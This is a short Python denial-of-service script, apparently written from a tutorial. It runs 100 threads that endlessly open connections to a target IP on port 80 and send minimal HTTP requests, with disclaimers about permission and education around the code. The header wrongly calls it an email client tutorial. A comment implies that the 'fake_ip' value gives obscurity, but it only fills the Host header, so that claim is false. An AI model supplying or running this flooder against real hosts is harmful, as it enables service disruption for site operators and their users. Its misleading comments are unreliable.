#!/usr/bin/env python3
## email client tutorial on freecode.com done by neuralNine

## ONLY RUN THIS ON YOUR HOMELAB OR SOMEWHERE THAT GAVE YOU PERMISSION TO
## Running this on anything that you DO NOT have Explicit Written Permission to do so!
## This is only for Educational Purposes, This IS ILLEGAL without permission, coming with potential jail time.
# this is not an optimal script it just concept, would not be used in "real" life

import threading
import socket

# using private ip's as examples
target = '10.0.0.138'
# depending on the service you are ddosing
port = 80
# NOT granteed but may provide slight obscurity
fake_ip = '182.21.20.32'

#already_connected = 0

def attack():
    while True:
        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        #global already_connnected
        #already_connected +=1
        ###print(already_connnected) # this would slow down the script but you could see info
        ## this should be less slow
        #if already_connected % 100 == 0:
        #    print(already_connected)

# can change the range of threading, tut example said it could be 50 but they went for 500
for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
